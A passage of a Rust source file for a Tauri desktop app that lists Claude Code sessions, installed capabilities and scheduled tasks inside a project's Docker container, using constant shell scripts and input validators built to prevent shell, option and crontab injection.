//! Read-only introspection of what lives inside a project's container.
//!
//! Three inventories are exposed to the GUI:
//!   1. Claude Code sessions (transcripts on the persistent config volume)
//!   2. Container capabilities (skills / agents / commands / hooks / plugins / MCP)
//!   3. Scheduled tasks managed by the in-container `triple-c-scheduler`
//!
//! Everything here is read-only except the explicitly-mutating scheduler
//! commands at the bottom of the file (add/update, enable/disable, run, remove,
//! clear notifications), which shell out to the scheduler's own subcommands
//! rather than editing its state files.
//!
//! ## Container access
//!
//! All work happens inside the container via the existing `docker exec`
//! plumbing in [`crate::docker::exec`] — no second mechanism is introduced.
//! The heavy lifting (walking dirs, grepping transcripts, parsing JSON with
//! `jq`) runs *in* the container and only a small JSON summary crosses the
//! wire, so multi-megabyte transcripts are never streamed back.
//!
//! `HOME` is passed explicitly on every exec: `docker exec` inherits the
//! container image's environment rather than the target user's, so `$HOME` is
//! not reliably `/home/claude` otherwise (see `download_container_backup`,
//! which does the same).
//!
//! ## Injection safety
//!
//! Two rules, applied together (defense in depth):
//!
//! * The `sh -c` scripts below are compile-time constants. No caller-supplied
//!   value is ever interpolated into them.
//! * Every command that takes a caller-supplied value runs as a plain **argv
//!   vector** with no shell in the process tree at all, so shell metacharacters
//!   are inert by construction. On top of that, ids are validated against a
//!   strict allowlist ([`validate_task_id`], [`validate_session_id`]) that
//!   admits no shell metacharacters, no `/`, no `.` (so no path traversal into
//!   the scheduler's task dir), and no leading `-` (so no option injection).
//!
//! Creating a task ([`add_scheduled_task`]) is the one place where *arbitrary*
//! user text — a task name, a whole Claude prompt — is handed to the container.
//! It cannot be allowlisted, so it relies on the argv rule above plus
//! [`ValidatedTaskInput`], which caps lengths, forbids control characters in
//! single-line fields, and rejects a name that could be read as an option.
//!
//! The cron expression gets one extra guarantee. It is the only user-supplied
//! value the scheduler writes into the *crontab* (`<schedule> <runner> <id>`),
//! so a newline in it would be a crontab-injection primitive.
//! [`validate_cron_expression`] therefore re-emits the five parsed fields
//! joined by single spaces and only the normalised form is sent onward, so no
//! whitespace the user typed can survive into a crontab line.
//!
//! ## Degradation
//!
//! A stopped or missing container is a normal state, not an error: the
//! read-only commands return empty/zero results. Only the mutating scheduler
//! commands fail loudly, since they cannot do anything useful without a
//! running container.

use bollard::exec::{CreateExecOptions, StartExecOptions};
use serde::{Deserialize, Serialize};
use tauri::State;

use crate::docker::client::get_docker;
use crate::docker::container::is_container_running;
use crate::docker::exec::{exec_oneshot_env, exec_oneshot_env_status};
use crate::AppState;

/// Newest N session transcripts to inspect. Caps the work done inside the
/// container regardless of how much history has accumulated on the volume.
const MAX_SESSIONS: usize = 50;

/// Newest N scheduler notifications to return.
const MAX_NOTIFICATIONS: usize = 50;

const CONTAINER_HOME: &str = "/home/claude";

/// Caps on the free-text fields of a scheduled task. They exist to keep a
/// runaway paste out of the container's task JSON and out of the `docker exec`
/// payload; they are generous enough for a real prompt.
const MAX_TASK_NAME_LEN: usize = 100;
const MAX_TASK_PROMPT_LEN: usize = 8_000;
const MAX_WORKING_DIR_LEN: usize = 512;
const MAX_CRON_LEN: usize = 256;

/// The scheduler's own default working directory (`cmd_add`).
const DEFAULT_WORKING_DIR: &str = "/workspace";

// ─────────────────────────────────────────────────────────────────────────────
// Response models
//
// These live here (rather than in `models/`) so this feature is confined to a
// single file; they are IPC response shapes, not persisted state.
// ─────────────────────────────────────────────────────────────────────────────

/// One Claude Code session transcript found inside the container.
#[derive(Debug, Clone, Serialize)]
pub struct ClaudeSession {
    /// Session UUID (the transcript's filename stem, and what `--resume` takes).
    pub id: String,
    /// User-set display name (`claude -n <name>`), if the session has one.
    pub name: Option<String>,
    /// Best available one-line description: Claude's auto-generated title if it
    /// produced one, otherwise the last prompt sent in the session.
    pub summary: Option<String>,
    /// Transcript mtime as an ISO 8601 / RFC 3339 timestamp (UTC).
    pub last_modified: String,
    pub size_bytes: u64,
    /// Approximate user + assistant turn count (counted by line, cheap).
    pub message_count: u64,
    /// The directory the session was started in.
    pub cwd: Option<String>,
}

/// A single installed capability (skill, agent, command, hook event, …).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapabilityItem {
    pub name: String,
    pub description: Option<String>,
    /// `"user"` (from `~/.claude`) or `"project"` (from a mounted workspace).
    pub scope: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CapabilityGroup {
    pub count: u64,
    pub items: Vec<CapabilityItem>,
}

/// Inventory of everything Claude Code has available inside the container.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ContainerCapabilities {
    pub skills: CapabilityGroup,
    pub agents: CapabilityGroup,
    pub commands: CapabilityGroup,
    /// One item per configured hook event; `count` is the total number of
    /// individual hook handlers across all events.
    pub hooks: CapabilityGroup,
    pub plugins: CapabilityGroup,
    pub mcp_servers: CapabilityGroup,
}

/// A task managed by the in-container `triple-c-scheduler`.
///
/// Mirrors the scheduler's own on-disk JSON schema
/// (`~/.claude/scheduler/tasks/<id>.json`).
#[derive(Debug, Clone, Serialize)]
pub struct ScheduledTask {
    pub id: String,
    pub name: String,
    pub prompt: String,
    /// Cron expression. One-shot tasks are also stored as a cron expression;
    /// see `at` for the original wall-clock time.
    pub schedule: String,
    /// `"recurring"` or `"once"` (the scheduler's `type` field).
    pub task_type: String,
    /// Original `--at` value (`"YYYY-MM-DD HH:MM"`) for one-shot tasks.
    pub at: Option<String>,
    pub enabled: bool,
    pub working_dir: String,
    pub created_at: Option<String>,
    /// Derived from the newest file in `~/.claude/scheduler/logs/<id>/`; the
    /// scheduler does not record this in the task JSON itself.
    pub last_run: Option<String>,
    /// Only known for enabled one-shot tasks (their `at` time). Recurring cron
    /// expressions are not evaluated here.
    pub next_run: Option<String>,
    /// Whether a run is in flight right now, from the runner's state file in
    /// `~/.claude/scheduler/running/<id>.json` with its pid verified live.
    pub running: bool,
    /// When the in-flight run started, ISO 8601 (UTC). `None` unless `running`.
    pub running_since: Option<String>,
}

/// A completion notice written by `triple-c-task-runner` after a task ran.
#[derive(Debug, Clone, Serialize)]
pub struct SchedulerNotification {
    pub task_id: String,
    pub task_name: Option<String>,
    /// `"SUCCESS"` or `"FAILED (exit code N)"`.
    pub status: Option<String>,
    /// The runner's own human-readable timestamp line.
    pub time: Option<String>,
    pub task_type: Option<String>,
    /// Tail of the run's log that the runner captured.
    pub summary: Option<String>,
    /// Full notification text, verbatim.
    pub body: String,
    /// Notification file mtime, ISO 8601 (UTC).
    pub created_at: String,
}

// ─────────────────────────────────────────────────────────────────────────────
// Shared helpers
// ─────────────────────────────────────────────────────────────────────────────

/// Resolve a project to a *running* container id.
///
/// `Ok(None)` means "there is nothing to inspect" — no container recorded, or
/// the container exists but is stopped. Callers that are read-only turn that
/// into an empty result; mutating callers turn it into an error.
/// `Err` is reserved for a genuinely unknown project id.
async fn running_container_for(
    project_id: &str,
    state: &State<'_, AppState>,
) -> Result<Option<String>, String> {
    let project = state
        .projects_store
        .get(project_id)
        .ok_or_else(|| format!("Project {} not found", project_id))?;

    let container_id = match project.container_id {
        Some(id) => id,
        None => return Ok(None),
    };

    if is_container_running(&container_id).await.unwrap_or(false) {
        Ok(Some(container_id))
    } else {
        Ok(None)
    }
}

/// Same as [`running_container_for`], but a stopped container is an error.
/// Used by the mutating scheduler commands.
async fn require_running_container(
    project_id: &str,
    state: &State<'_, AppState>,
) -> Result<String, String> {
    running_container_for(project_id, state).await?.ok_or_else(|| {
        "Container is not running — start the project first.".to_string()
    })
}

fn home_env() -> Vec<String> {
    vec![format!("HOME={}", CONTAINER_HOME)]
}

/// Run one of this module's constant scripts under `sh -c` and return stdout.
///
/// The scripts redirect their own stderr to `/dev/null` (`exec 2>/dev/null` on
/// the first line) so the combined stream `exec_oneshot_env` returns is pure
/// stdout and stays parseable as JSON. A non-zero exit therefore surfaces as
/// empty output, which the callers treat as "nothing to report".
async fn run_script(container_id: &str, script: impl Into<String>) -> Result<String, String> {
    exec_oneshot_env(
        container_id,
        vec!["sh".to_string(), "-c".to_string(), script.into()],
        home_env(),
    )
    .await
}

/// Parse script output as JSON, degrading to a default value (and a log line)
/// rather than failing the whole command if the container returned something
/// unexpected.
fn parse_or_default<T: Default + serde::de::DeserializeOwned>(raw: &str, what: &str) -> T {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return T::default();
    }
    match serde_json::from_str::<T>(trimmed) {
        Ok(v) => v,
        Err(e) => {
            log::warn!(
                "Failed to parse {} JSON from container ({}): {}",
                what,
                e,
                trimmed.chars().take(300).collect::<String>()
            );
            T::default()
        }
    }
}

fn epoch_to_iso(epoch: i64) -> String {
    chrono::DateTime::from_timestamp(epoch, 0)
        .unwrap_or_default()
        .to_rfc3339()
}

/// Strict allowlist for scheduler task ids.
///
/// The scheduler generates ids as 8 lowercase hex chars (`head -c 4
/// /dev/urandom | od -An -tx1`). This accepts that plus a small tolerant
/// superset, while admitting **no** shell metacharacters, no `/` or `.` (so a
/// crafted id cannot escape `~/.claude/scheduler/tasks/`), and no leading `-`
/// (so it cannot be mistaken for an option). Combined with argv-only execution
/// this makes shell injection structurally impossible.
fn validate_task_id(id: &str) -> Result<(), String> {
    let valid = !id.is_empty()
        && id.len() <= 64
        && id.starts_with(|c: char| c.is_ascii_alphanumeric())
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
    if valid {
        Ok(())
    } else {
        Err(format!("Invalid scheduler task id: {:?}", id))
    }
}

/// Strict allowlist for session ids (Claude Code uses UUIDs).
fn validate_session_id(id: &str) -> Result<(), String> {
    let valid = !id.is_empty()
        && id.len() <= 64
        && id.starts_with(|c: char| c.is_ascii_alphanumeric())
        && id.chars().all(|c| c.is_ascii_hexdigit() || c == '-');
    if valid {
        Ok(())
    } else {
        Err(format!("Invalid session id: {:?}", id))
    }
}

/// Run `triple-c-scheduler <args…>` as a bare argv vector — no shell is
/// involved, so caller-supplied ids cannot be interpreted as shell syntax.
/// Returns the combined output, erroring with it on a non-zero exit.
async fn run_scheduler(container_id: &str, args: Vec<String>) -> Result<String, String> {
    let mut cmd = vec!["triple-c-scheduler".to_string()];
    cmd.extend(args);

    let (output, exit_code) = exec_oneshot_env_status(container_id, cmd, home_env()).await?;
    if exit_code != 0 {
        let detail = output.trim();
        return Err(if detail.is_empty() {
            format!("triple-c-scheduler failed (exit {})", exit_code)
        } else {
            detail.to_string()
        });
    }
    Ok(output)
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. Sessions
// ─────────────────────────────────────────────────────────────────────────────

/// Emits a JSON array describing the newest transcripts on the config volume.
///
/// Layout (verified empirically against Claude Code 2.1.226): transcripts are
/// JSON Lines at `~/.claude/projects/<cwd-with-slashes-turned-into-dashes>/<uuid>.jsonl`.
///
/// Metadata is pulled with a single `grep -o` pass per file that yields whole
/// JSON key/value fragments; each fragment is already a valid JSON object body,
/// so wrapping it in braces and letting `jq` merge them decodes escapes
/// correctly without ever parsing a full transcript line-by-line. Later records
/// win (so the newest title/prompt is used) except `cwd`, where the first
/// record wins (the directory the session actually started in). Malformed lines
/// simply fail to match and are skipped.
const SESSIONS_SCRIPT: &str = r#"exec 2>/dev/null
set -u
ROOT="$HOME/.claude/projects"
[ -d "$ROOT" ] || { echo '[]'; exit 0; }
TAB=$(printf '\t')
find "$ROOT" -mindepth 2 -maxdepth 2 -name '*.jsonl' -type f -printf '%T@\t%s\t%p\n' \
  | sort -rn | head -__MAX__ \
  | while IFS="$TAB" read -r mtime size path; do
      [ -n "${path:-}" ] || continue
      [ "${size:-0}" -gt 0 ] || continue
      id=$(basename "$path" .jsonl)
      meta=$(grep -aoE '"(cwd|aiTitle|customTitle|agentName|lastPrompt|summary)":"([^"\\]|\\.)*"' "$path" \
             | sed 's/^/{/; s/$/}/' \
             | jq -c -s '(reduce .[] as $o ({}; . + $o)) + (([.[] | select(has("cwd"))] | first) // {})') || meta=''
      [ -n "$meta" ] || meta='{}'
      count=$(grep -acE '"type":"(user|assistant)"' "$path") || count=0
      jq -c -n --arg id "$id" --arg mt "${mtime%%.*}" --arg sz "$size" --arg mc "$count" --argjson meta "$meta" \
        '{id: $id,
          modified_epoch: ($mt | tonumber),
          size_bytes: ($sz | tonumber),
          message_count: ($mc | tonumber),
          name: ($meta.customTitle // $meta.agentName // null),
          summary: ($meta.aiTitle // $meta.summary // $meta.lastPrompt // null),
          cwd: ($meta.cwd // null)}'
    done | jq -s '.'
"#;

#[derive(Debug, Deserialize)]
struct RawSession {
    id: String,
    modified_epoch: i64,
    size_bytes: u64,
    message_count: u64,
    name: Option<String>,
    summary: Option<String>,
    cwd: Option<String>,
}

/// List the Claude Code sessions stored inside a project's container, newest
/// first, capped at [`MAX_SESSIONS`].
///
/// Returns an empty vec (no error) when the container is stopped or has never
/// been started.
#[tauri::command]
pub async fn list_claude_sessions(
    project_id: String,
    state: State<'_, AppState>,
) -> Result<Vec<ClaudeSession>, String> {
    let container_id = match running_container_for(&project_id, &state).await? {
        Some(id) => id,
        None => return Ok(Vec::new()),
    };

    // `head -N` is the only piece of the script that varies, and it comes from
    // a const usize — never from the caller.
    let script = SESSIONS_SCRIPT.replace("__MAX__", &MAX_SESSIONS.to_string());

    let raw = run_script(&container_id, script).await?;
    let sessions: Vec<RawSession> = parse_or_default(&raw, "session list");

    Ok(sessions
        .into_iter()
        .map(|s| ClaudeSession {
            id: s.id,
            name: s.name.filter(|v| !v.is_empty()),
            summary: s.summary.filter(|v| !v.is_empty()),
            last_modified: epoch_to_iso(s.modified_epoch),
            size_bytes: s.size_bytes,
            message_count: s.message_count,
            cwd: s.cwd.filter(|v| !v.is_empty()),
        })
        .collect())
}

/// Build the shell command line that resumes a session, for the frontend to
/// drop into a terminal.
///
/// The flag spelling was checked against the CLI in the container image:
/// `claude --resume <session-id>` (short form `-r`).
///
/// The project's permission mode is folded in so the resumed session behaves
/// like a freshly opened one. The session id is validated first, and the
/// returned string contains only allowlisted characters.
#[tauri::command]
pub async fn resume_session_command(
    project_id: String,
    session_id: String,
    state: State<'_, AppState>,
) -> Result<String, String> {
    validate_session_id(&session_id)?;

    let project = state
        .projects_store
        .get(&project_id)
        .ok_or_else(|| format!("Project {} not found", project_id))?;

    let mut parts = vec!["claude".to_string()];
    parts.extend(project.effective_permission_mode().cli_args());
    parts.push("--resume".to_string());
    parts.push(session_id);

    Ok(parts.join(" "))
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. Capabilities
// ─────────────────────────────────────────────────────────────────────────────

/// Emits a single JSON object with one group per capability category.
///
/// User scope is `~/.claude`. Project scope is `/workspace/.claude` *and*
/// `/workspace/<mount>/.claude` — Triple-C mounts each project path at
/// `/workspace/<mount_name>`, so a repo's own `.claude` dir lives one level
/// down, not at the workspace root.
///
/// Frontmatter `name`/`description` are pulled with a small `awk` reader
/// (first `---` block only, first matching key, surrounding quotes stripped);
/// no YAML crate is involved. Files without frontmatter fall back to their
/// path-derived name.
const CAPABILITIES_SCRIPT: &str = r#"exec 2>/dev/null
set -u
USER_BASE="$HOME/.claude"

# Project-scoped config roots: the workspace root plus each mounted project dir.
proj_bases() {
  [ -d /workspace/.claude ] && echo /workspace/.claude
  for d in /workspace/*/; do
    [ -d "$d/.claude" ] && echo "${d}.claude"
  done
}

# fm <file> <key> — value of a YAML frontmatter key, or nothing.
fm() {
  [ -f "$1" ] || return 0
  head -1 "$1" | grep -q '^---[[:space:]]*$' || return 0
  awk -v key="$2" '
    NR == 1 { next }
    /^---[[:space:]]*$/ { exit }
    {
      pfx = key ":"
      if (index($0, pfx) == 1) {
        v = substr($0, length(pfx) + 1)
        sub(/^[ \t]+/, "", v); sub(/[ \t\r]+$/, "", v)
        if (v ~ /^".*"$/) v = substr(v, 2, length(v) - 2)
        else if (v ~ /^\047.*\047$/) v = substr(v, 2, length(v) - 2)
        print v
        exit
      }
    }' "$1"
}

emit_item() {
  jq -c -n --arg n "$1" --arg d "$2" --arg s "$3" \
    '{name: $n, description: (if $d == "" then null else $d end), scope: $s}'
}

collect_skills() {
  base="$1"; scope="$2"
  [ -d "$base/skills" ] || return 0
  for d in "$base"/skills/*/; do
    [ -f "$d/SKILL.md" ] || continue
    n=$(fm "$d/SKILL.md" name)
    [ -n "$n" ] || n=$(basename "$d")
    emit_item "$n" "$(fm "$d/SKILL.md" description)" "$scope"
  done
}

collect_md() {
  base="$1"; scope="$2"; sub="$3"
  [ -d "$base/$sub" ] || return 0
  find "$base/$sub" -name '*.md' -type f | sort | while read -r f; do
    rel=${f#"$base/$sub/"}; rel=${rel%.md}
    n=$(fm "$f" name)
    [ -n "$n" ] || n="$rel"
    emit_item "$n" "$(fm "$f" description)" "$scope"
  done
}

# One item per hook event; `count` carries the number of individual handlers so
# the caller can sum them into the group total.
collect_hooks() {
  base="$1"; scope="$2"
  for sf in "$base/settings.json" "$base/settings.local.json"; do
    [ -f "$sf" ] || continue
    jq -c --arg s "$scope" --arg f "$(basename "$sf")" '
      (.hooks // {}) | to_entries[] |
      ([.value[]? | (.hooks // []) | length] | add // 0) as $n |
      {name: .key,
       description: ($f + ": " + ($n | tostring) + " handler(s)"),
       scope: $s,
       count: $n}' "$sf"
  done
}

collect_plugins() {
  ip="$USER_BASE/plugins/installed_plugins.json"
  [ -f "$ip" ] && jq -c '(.plugins // {}) | to_entries[] |
      {name: .key,
       description: ((.value[0].version // "") | if . == "" then null else "v" + . end),
       scope: (.value[0].scope // "user")}' "$ip"
  for cf in "$USER_BASE/settings.json" "$HOME/.claude.json"; do
    [ -f "$cf" ] || continue
    jq -c '(.enabledPlugins // {}) | to_entries[] | select(.value == true) |
      {name: .key, description: "enabled", scope: "user"}' "$cf"
  done
}

collect_mcp() {
  if [ -f "$HOME/.claude.json" ]; then
    jq -c '(.mcpServers // {}) | to_entries[] |
      {name: .key, description: ((.value.command // .value.url // .value.type) // null),
       scope: "user"}' "$HOME/.claude.json"
    jq -c '(.projects // {}) | to_entries[] | (.value.mcpServers // {}) | to_entries[] |
      {name: .key, description: ((.value.command // .value.url // .value.type) // null),
       scope: "project"}' "$HOME/.claude.json"
  fi
  for mf in /workspace/.mcp.json /workspace/*/.mcp.json; do
    [ -f "$mf" ] || continue
    jq -c '(.mcpServers // {}) | to_entries[] |
      {name: .key, description: ((.value.command // .value.url // .value.type) // null),
       scope: "project"}' "$mf"
  done
}

group() { jq -s 'unique_by([.scope, .name]) | {count: length, items: .}'; }

all_skills()   { collect_skills "$USER_BASE" user; proj_bases | while read -r b; do collect_skills "$b" project; done; }
all_agents()   { collect_md "$USER_BASE" user agents; proj_bases | while read -r b; do collect_md "$b" project agents; done; }
all_commands() { collect_md "$USER_BASE" user commands; proj_bases | while read -r b; do collect_md "$b" project commands; done; }
all_hooks()    { collect_hooks "$USER_BASE" user; proj_bases | while read -r b; do collect_hooks "$b" project; done; }

jq -c -n \
  --argjson skills   "$(all_skills | group)" \
  --argjson agents   "$(all_agents | group)" \
  --argjson commands "$(all_commands | group)" \
  --argjson hooks    "$(all_hooks | jq -s '{count: ([.[].count] | add // 0), items: map(del(.count))}')" \
  --argjson plugins  "$(collect_plugins | group)" \
  --argjson mcp      "$(collect_mcp | group)" \
  '{skills: $skills, agents: $agents, commands: $commands,
    hooks: $hooks, plugins: $plugins, mcp_servers: $mcp}'
"#;

/// Inventory the Claude Code capabilities installed inside a project's
/// container. A stopped container yields all-zero groups, not an error.
#[tauri::command]
pub async fn list_container_capabilities(
    project_id: String,
    state: State<'_, AppState>,
) -> Result<ContainerCapabilities, String> {
    let container_id = match running_container_for(&project_id, &state).await? {
        Some(id) => id,
        None => return Ok(ContainerCapabilities::default()),
    };

    let raw = run_script(&container_id, CAPABILITIES_SCRIPT).await?;
    Ok(parse_or_default(&raw, "container capabilities"))
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. Scheduler
// ─────────────────────────────────────────────────────────────────────────────

/// Emits the scheduler's tasks as JSON, mirroring its on-disk schema:
/// `{id, name, prompt, schedule, type, at, created_at, enabled, working_dir}`.
///
/// `last_run` is not in that schema, so it is derived from the mtime of the
/// newest file in `~/.claude/scheduler/logs/<id>/`.
const SCHEDULER_LIST_SCRIPT: &str = r#"exec 2>/dev/null
set -u
TASKS="$HOME/.claude/scheduler/tasks"
LOGS="$HOME/.claude/scheduler/logs"
RUNNING="$HOME/.claude/scheduler/running"
[ -d "$TASKS" ] || { echo '[]'; exit 0; }
for f in "$TASKS"/*.json; do
  [ -f "$f" ] || continue
  id=$(jq -r '.id // ""' "$f") || continue
  [ -n "$id" ] || id=$(basename "$f" .json)
  last=$(find "$LOGS/$id" -name '*.log' -type f -printf '%T@\n' | sort -rn | head -1)
  # Live-run state. The pid is checked, not trusted: a container stopped
  # mid-run cannot fire the runner's cleanup trap, and a task stuck on
  # "running" forever is a worse lie than showing nothing.
  started=""
  state="$RUNNING/$id.json"
  if [ -f "$state" ]; then
    pid=$(jq -r '.pid // empty' "$state")
    if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
      started=$(jq -r '.started_epoch // empty' "$state")
    fi
  fi
  jq -c --arg fallback_id "$id" --arg lr "${last%%.*}" --arg started "$started" '{
      id: (if (.id // "") == "" then $fallback_id else .id end),
      name: (.name // ""),
      prompt: (.prompt // ""),
      schedule: (.schedule // ""),
      task_type: (.type // "recurring"),
      at: (if (.at // "") == "" then null else .at end),
      enabled: (.enabled == true),
      working_dir: (.working_dir // "/workspace"),
      created_at: (.created_at // null),
      last_run_epoch: (if $lr == "" then null else ($lr | tonumber) end),
      running_since_epoch: (if $started == "" then null else ($started | tonumber) end)
    }' "$f"
done | jq -s 'sort_by(.name, .id)'
"#;

/// Emits the newest notification files as structured JSON. The runner writes
/// them as a fixed plain-text block (`Task:`/`Status:`/`Time:`/`Type:` then a
/// `Summary:` body), which is parsed here; the verbatim text is kept too.
const SCHEDULER_NOTIFICATIONS_SCRIPT: &str = r#"exec 2>/dev/null
set -u
NDIR="$HOME/.claude/scheduler/notifications"
[ -d "$NDIR" ] || { echo '[]'; exit 0; }
TAB=$(printf '\t')
find "$NDIR" -maxdepth 1 -name '*.notify' -type f -printf '%T@\t%p\n' \
  | sort -rn | head -__MAX__ \
  | while IFS="$TAB" read -r mtime path; do
      [ -f "$path" ] || continue
      base=$(basename "$path" .notify)
      jq -c -n --arg tid "${base%%_*}" --arg mt "${mtime%%.*}" --rawfile body "$path" '{
        task_id: $tid,
        created_epoch: ($mt | tonumber),
        task_name: (($body | capture("Task:[ \t]+(?<v>.*)") | .v | sub("[ \t]+$"; "")) // null),
        status: (($body | capture("Status:[ \t]+(?<v>.*)") | .v | sub("[ \t]+$"; "")) // null),
        time: (($body | capture("Time:[ \t]+(?<v>.*)") | .v | sub("[ \t]+$"; "")) // null),
        task_type: (($body | capture("Type:[ \t]+(?<v>.*)") | .v | sub("[ \t]+$"; "")) // null),
        summary: (($body | capture("Summary:\n(?<v>[\\s\\S]*)") | .v) // null),
        body: $body
      }'
    done | jq -s '.'
"#;

#[derive(Debug, Deserialize)]
struct RawScheduledTask {
    id: String,
    name: String,
    prompt: String,
    schedule: String,
    task_type: String,
    at: Option<String>,
    enabled: bool,
    working_dir: String,
    created_at: Option<String>,
    last_run_epoch: Option<i64>,
    running_since_epoch: Option<i64>,
}

#[derive(Debug, Deserialize)]
struct RawNotification {
    task_id: String,
    created_epoch: i64,
    task_name: Option<String>,
    status: Option<String>,
    time: Option<String>,
    task_type: Option<String>,
    summary: Option<String>,
    body: String,
}

/// List the container's scheduled tasks. Stopped container → empty vec.
#[tauri::command]
pub async fn list_scheduled_tasks(
    project_id: String,
    state: State<'_, AppState>,
) -> Result<Vec<ScheduledTask>, String> {
    let container_id = match running_container_for(&project_id, &state).await? {
        Some(id) => id,
        None => return Ok(Vec::new()),
    };

    let raw = run_script(&container_id, SCHEDULER_LIST_SCRIPT).await?;
    let tasks: Vec<RawScheduledTask> = parse_or_default(&raw, "scheduled tasks");

    Ok(tasks
        .into_iter()
        .map(|t| {
            // A one-shot task's `at` time is its next (and only) run. Recurring
            // cron expressions are left uncomputed rather than guessed at.
            let next_run = if t.task_type == "once" && t.enabled {
                t.at.clone()
            } else {
                None
            };
            ScheduledTask {
                id: t.id,
                name: t.name,
                prompt: t.prompt,
                schedule: t.schedule,
                task_type: t.task_type,
                at: t.at,
                enabled: t.enabled,
                working_dir: t.working_dir,
                created_at: t.created_at,
                last_run: t.last_run_epoch.map(epoch_to_iso),
                next_run,
                running: t.running_since_epoch.is_some(),
                running_since: t.running_since_epoch.map(epoch_to_iso),
            }
        })
        .collect())
}

/// Tail the most recent log for one task, via the scheduler's own `logs`
/// subcommand. Stopped container → empty string.
#[tauri::command]
pub async fn get_scheduled_task_log(
    project_id: String,
    task_id: String,
    tail_lines: Option<u32>,
    state: State<'_, AppState>,
) -> Result<String, String> {
    validate_task_id(&task_id)?;
    // Clamped, and an integer by type — cannot carry shell syntax.
    let tail = tail_lines.unwrap_or(200).clamp(1, 5000);

    let container_id = match running_container_for(&project_id, &state).await? {
        Some(id) => id,
        None => return Ok(String::new()),
    };

    run_scheduler(
        &container_id,
        vec![
            "logs".to_string(),
            "--id".to_string(),
            task_id,
            "--tail".to_string(),
            tail.to_string(),
        ],
    )
    .await
}

/// Read the scheduler's pending completion notifications, newest first.
/// Stopped container → empty vec.
#[tauri::command]
pub async fn get_scheduler_notifications(
    project_id: String,
    state: State<'_, AppState>,
) -> Result<Vec<SchedulerNotification>, String> {
    let container_id = match running_container_for(&project_id, &state).await? {
        Some(id) => id,
        None => return Ok(Vec::new()),
    };

    let script =
        SCHEDULER_NOTIFICATIONS_SCRIPT.replace("__MAX__", &MAX_NOTIFICATIONS.to_string());

    let raw = run_script(&container_id, script).await?;
    let notifications: Vec<RawNotification> = parse_or_default(&raw, "scheduler notifications");

    Ok(notifications
        .into_iter()
        .map(|n| SchedulerNotification {
            task_id: n.task_id,
            task_name: n.task_name,
            status: n.status,
            time: n.time,
            task_type: n.task_type,
            summary: n.summary.map(|s| s.trim_end().to_string()).filter(|s| !s.is_empty()),
            body: n.body,
            created_at: epoch_to_iso(n.created_epoch),
        })
        .collect())
}

// ── Task creation: input validation ──────────────────────────────────────────

/// Which of the scheduler's two mutually-exclusive schedule flags to use.
///
/// `triple-c-scheduler add` takes either `--schedule "<cron>"` (recurring) or
/// `--at "YYYY-MM-DD HH:MM"` (one-shot) and errors if given both or neither.
/// Modelling that as an enum makes the invalid combinations unrepresentable.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum ScheduleKind {
    Recurring,
    Once,
}

impl ScheduleKind {
    fn flag(self) -> &'static str {
        match self {
            ScheduleKind::Recurring => "--schedule",
            ScheduleKind::Once => "--at",
        }
    }
}

/// A task's fields after validation and normalisation. Constructing one is the
/// only way to build the argv for `triple-c-scheduler add`.
#[derive(Debug, Clone, PartialEq, Eq)]
struct ValidatedTaskInput {
    name: String,
    prompt: String,
    kind: ScheduleKind,
    /// Normalised cron expression or `YYYY-MM-DD HH:MM` timestamp.
    schedule: String,
    working_dir: String,
}

impl ValidatedTaskInput {
    /// The argv for `triple-c-scheduler add …`, one element per value.
    ///
    /// Note what is *not* here: no quoting, no escaping, no `sh -c`. Every
    /// field is its own argv element, so quotes, `;`, `$(…)`, backticks and
    /// newlines inside a prompt reach the scheduler as literal data.
    fn add_args(&self) -> Vec<String> {
        vec![
            "add".to_string(),
            "--name".to_string(),
            self.name.clone(),
            "--prompt".to_string(),
            self.prompt.clone(),
            self.kind.flag().to_string(),
            self.schedule.clone(),
            "--working-dir".to_string(),
            self.working_dir.clone(),
        ]
    }
}

/// Reject control characters. Single-line fields admit none at all; the prompt
/// is allowed tab/newline (a multi-line prompt is normal) but never a NUL,
/// which cannot survive the exec API's C strings.
fn reject_control_chars(value: &str, field: &str, allow_newlines: bool) -> Result<(), String> {
    let offender = value.chars().find(|c| {
        c.is_control() && !(allow_newlines && matches!(c, '\n' | '\r' | '\t'))
    });
    match offender {
        Some(c) => Err(format!(
            "{} cannot contain the control character {:?}.",
            field, c
        )),
        None => Ok(()),
    }
}

fn validate_task_name(name: &str) -> Result<String, String> {
    let name = name.trim();
    if name.is_empty() {
        return Err("Task name is required.".to_string());
    }
    if name.chars().count() > MAX_TASK_NAME_LEN {
        return Err(format!(
            "Task name is too long (max {} characters).",
            MAX_TASK_NAME_LEN
        ));
    }
    reject_control_chars(name, "Task name", false)?;
    // The scheduler assigns `--name`'s value positionally, so a leading dash is
    // not exploitable today — but it would be the moment that parser changed,
    // and a task called `--id` is a bad idea regardless.
    if name.starts_with('-') {
        return Err("Task name cannot start with “-”.".to_string());
    }
    Ok(name.to_string())
}

fn validate_task_prompt(prompt: &str) -> Result<String, String> {
    let prompt = prompt.trim();
    if prompt.is_empty() {
        return Err("Task prompt is required.".to_string());
    }
    if prompt.chars().count() > MAX_TASK_PROMPT_LEN {
        return Err(format!(
            "Task prompt is too long (max {} characters).",
            MAX_TASK_PROMPT_LEN
        ));
    }
    reject_control_chars(prompt, "Task prompt", true)?;
    Ok(prompt.to_string())
}

/// `None`/blank falls back to the scheduler's own default, `/workspace`.
fn validate_working_dir(dir: Option<&str>) -> Result<String, String> {
    let dir = dir.map(str::trim).filter(|d| !d.is_empty()).unwrap_or(DEFAULT_WORKING_DIR);
    if dir.chars().count() > MAX_WORKING_DIR_LEN {
        return Err(format!(
            "Working directory is too long (max {} characters).",
            MAX_WORKING_DIR_LEN
        ));
    }
    reject_control_chars(dir, "Working directory", false)?;
    if !dir.starts_with('/') {
        return Err("Working directory must be an absolute path inside the container, e.g. /workspace.".to_string());
    }
    if dir.split('/').any(|segment| segment == "..") {
        return Err("Working directory cannot contain “..”.".to_string());
    }
    Ok(dir.to_string())
}

